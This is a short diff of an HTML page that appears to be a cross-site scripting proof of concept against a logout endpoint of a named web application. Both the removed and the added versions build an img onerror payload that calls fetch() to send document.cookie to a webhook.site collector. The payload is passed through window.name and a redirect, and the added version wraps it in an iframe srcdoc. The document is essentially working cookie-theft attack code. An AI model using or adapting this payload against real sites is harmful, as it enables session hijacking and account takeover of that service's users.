@@ -1,13 +1,11 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <script>
-      const steal = `
-        <img src=x onerror=(()=>fetch('https://webhook.site/eef1b76d-4e01-4f2a-ae89-f43530997756?d='+document.cookie))()>
-      `;
-      const encoded = encodeURIComponent(steal);
-      window.name = steal;
-      location.href = "https://app.empireflippers.com/logout?session=" + encoded;
-    </script>
+    <iframe srcdoc="
+  <script>
+    window.name = '<img src=x onerror=(()=>fetch(`https://webhook.site/eef1b76d-4e01-4f2a-ae89-f43530997756?c=${document.cookie}`))()>';
+    location = 'https://app.empireflippers.com/logout?session=' + encodeURIComponent(window.name);
+  <\/script>
+"></iframe>
   </body>
 </html>
